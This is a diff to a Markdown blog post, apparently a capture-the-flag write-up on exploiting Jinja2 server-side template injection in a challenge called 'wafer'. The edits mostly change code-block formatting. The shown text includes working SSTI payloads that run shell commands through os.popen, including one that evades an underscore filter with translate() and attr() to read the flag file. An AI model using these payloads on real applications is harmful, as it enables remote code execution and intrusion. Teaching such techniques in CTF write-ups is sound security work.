@@ -35,10 +35,11 @@ This confirms that we are dealing with SSTI, and it seems that our input was bei
 
 ## Exploitation
 
-Simply copying and pasting in a default SSTI payload,
-{% highlight python %}
+Let's try copying and pasting in this [default SSTI payload](https://secure-cookie.io/attacks/ssti/).
+```python
 "foo".__class__.__base__.__subclasses__()[182].__init__.__globals__['sys'].modules['os'].popen("ls").read()
-{% endhighlight %}, won't work.  
+```
+It doesn't work, as below:  
 
 ![](/assets/images/ctf/defcamp/wafer/3.png)  
 
@@ -52,11 +53,11 @@ It worked, but now it's evaluating `.class` rather than `.__class__`, which isn'
 
 Knowing this, we need to find a way to get underscores into the input somehow via a method on a string. Looking through the results of `dir(str)` in Python reveals `.translate` as a good option, as it takes the ASCII character codes and converts them into their respective ASCII characters. See below:  
 
-{% highlight python %}
+```python
 'AAclassAA'.translate({65:95})
 # returns '__class__'
 # as the character codes for 'A' and '\_' are 65 and 95 respectively
-{% endhighlight %}  
+```
 
 We can't use the dot operator to access the attributes anymore as the attribute names will need to be strings rather than identifiers in order to insert the underscores into them. Therefore, we can use filters in Jinja2 to achieve the same result: `'foo'.__class__` is functionally the same as `'foo'|attr('__class__')`.  
 
@@ -64,9 +65,9 @@ One more thing to note is that the `182` in the original payload refers to the i
 
 Hence, our final payload with everything put into place is:  
 
-{% highlight python %}
+```python
 ((('a'|attr('AAclassAA'.translate({65:95}))|attr('AAbaseAA'.translate({65:95}))|attr('AAsubclassesAA'.translate({65:95}))())[184]|attr('ccinitcc'.translate({99:95}))|attr('AAglobalsAA'.translate({65:95})))['sys']|attr('modules'))['os']|attr('popen')('cat flag.txt')|attr('read')()
-{% endhighlight %}  
+```
 
 ![](/assets/images/ctf/defcamp/wafer/6.png)  
 
